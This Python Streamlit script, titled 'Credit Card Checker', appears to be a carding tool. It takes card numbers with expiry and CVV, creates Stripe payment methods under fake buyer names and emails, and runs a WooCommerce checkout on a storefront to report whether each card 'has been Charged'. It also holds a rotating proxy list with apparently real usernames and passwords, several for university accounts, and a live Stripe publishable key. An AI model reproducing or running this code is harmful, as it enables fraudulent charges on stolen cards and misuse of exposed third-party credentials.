import itertools
import json
import requests
from requests import Session
import random
import string
import streamlit as st
import os
name = f"melon{random.randint(1, 200000)}"
last = f"nakab{random.randint(1, 200000)}"
def generate_password(length=8):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))

    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
    domain = random.choice(domains)
    email = f"{username}@{domain}"

    return email, password, username

def find_between(s, start, end):
    try:
        start_index = s.find(start)
        if start_index == -1:
            return None
        start_index += len(start)
        end_index = s.find(end, start_index)
        if end_index == -1:
            return None
        return s[start_index:end_index].replace('\\"', '"')
    except ValueError:
        return

def main(cc, mm, yy, cvv):
    def bin_info(cc):
        response = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}')
        brand_mapping = {
            "VISA": "visa",
            "MASTERCARD": "mc",
            "AMERICAN EXPRESS": "amex",
            "DINERS CLUB": "diners",
            "DISCOVER": "discover"
        }
        response_data = response.json()
        brand = brand_mapping.get(response_data.get("brand", ""))

        # Check if the file exists before trying to open it
        # if os.path.exists('response_data.json'):
        #     with open('response_data.json', 'r') as f:
        #         data = json.load(f)
        #         for key, value in data.items():
        #             if "bin" == key:
        #                 st.write(f"Bin: {cc[:6]}")
        #             else:
        #                 capitalized_key = key.capitalize()
        #                 st.write(f"{capitalized_key}: {value}")
        # else:
        #     st.write("File 'response_data.json' not found.")
        return brand

    email = generate_password()[0]
    brand = bin_info(cc)

    r = requests.Session()
    r.cookies.clear()

    proxies = [
        'auth-proxy.unipd.it:8080:matteo.pastrello@studenti.unipd.it:Thepastro333',
        'auth-proxy.unipd.it:8080:gianmarco.favero.1@studenti.unipd.it:sossio1994',
        'residential.pingproxies.com:10597:Z57wqOkavdy1cCT_c_US:RNW78Fm5',
        'proxy-auth2.unifi.it:8888:7029876:Helise90!',
        'proxy.upe.br:9000:capesupe:2012_CAPESUPE',
        'proxy.uem.br:8080:pg54371:1994-09-15-5-M',
        'resi-v4.whiteproxies.com:27012',
        'rp.proxyscrape.com:6060:lrjwk4ipt5nkelz:8mm86becm14d41f',
        'proxy.proxyverse.io:9200:country-worldwide:ec86a464-0c10-4f9b-97b0-65b12c942bd7',
        'geo.iproyal.com:12321:uzo4qms5ClrnMrYt:QfuM7kG7RzJs8YED_country-bi',
        'geo.iproyal.com:12321:uzo4qms5ClrnMrYt:QfuM7kG7RzJs8YED_country-bi'
    ]

    proxy_cycle = itertools.cycle(proxies)
    proxy_str = next(proxy_cycle)
    formatted_proxy = {
        "http": f"http://{proxy_str}",
        "https": f"http://{proxy_str}"
    }

    url = "https://m.stripe.com/6"
    response = r.post(url)
    resultado13 = response.text
    muid = find_between(resultado13, '"muid":"', '"').strip()
    sid = find_between(resultado13, '"sid":"', '"').strip()
    guid = find_between(resultado13, '"guid":"', '"').strip()

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Referer': 'https://shop.blackhattoolsandcoursesshop.ru/page/3/',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=1',
    }

    params = {
        'add-to-cart': '63',
    }

    response = r.get('https://shop.blackhattoolsandcoursesshop.ru/checkout/', params=params, headers=headers)

    headers['Referer'] = 'https://shop.blackhattoolsandcoursesshop.ru/cart/'
    r3 = r.get('https://shop.blackhattoolsandcoursesshop.ru/checkout/', headers=headers)

    key = find_between(r3.text, '"key":"', '"')
    nonce = find_between(r3.text, 'name="woocommerce-process-checkout-nonce" value="', '"')

    headers.update({
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Referer': 'https://js.stripe.com',
        'Sec-Fetch-Site': 'same-site',
    })

    data = f'type=card&billing_details[name]={name}+{last}&billing_details[email]={email}&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid={guid}&muid={muid}&sid={sid}&key=pk_live_51NF3mmBYmW52Ch0ihxmv7AWOkHvzOk5AM8Th3mYVJeIH7m8XKoPYcbIJEEZpfM8UqpgFABYaWgK2exakF0XWLqxd00TkLXau4H'

    r4 = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    try:
        id = r4.json()['id']
    except KeyError:
        st.write("Error obtaining payment method ID.")
        return

    name = f"melon{random.randint(1, 200000)}"
    last = f"nakab{random.randint(1, 200000)}"

    headers.update({
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://shop.blackhattoolsandcoursesshop.ru',
        'Referer': 'https://shop.blackhattoolsandcoursesshop.ru/checkout/?add-to-cart=63',
    })

    params = {
        'wc-ajax': 'checkout',
    }

    data = f'billing_first_name={name}&billing_last_name={last}&billing_email={email}&payment_method=stripe&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source={id}'

    response = r.post('https://shop.blackhattoolsandcoursesshop.ru/', params=params, headers=headers, data=data)
    if 'success' in response.text:
        st.write(f'{cc}|{mm}|{yy}|{cvv} -> Card has been Charged Payment Done ✔️')
    else:
        msg = find_between(response.text, r'{"result":"failure","messages":"\n<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t', r'\t\t<\/li>\n\t<\/ul>\n"')
        st.write(f'{cc}|{mm}|{yy}|{cvv} -> {msg}')

def app():
    st.title("Credit Card Checker")

    with st.form(key='cc_form'):
        cc = st.text_input("Credit Card Number")
        mm = st.text_input("Expiry Month (MM)")
        yy = st.text_input("Expiry Year (YY)")
        cvv = st.text_input("CVV")
        submit_button = st.form_submit_button(label='Check Card')

    if submit_button:
        main(cc, mm, yy, cvv)

if __name__ == '__main__':
    app()
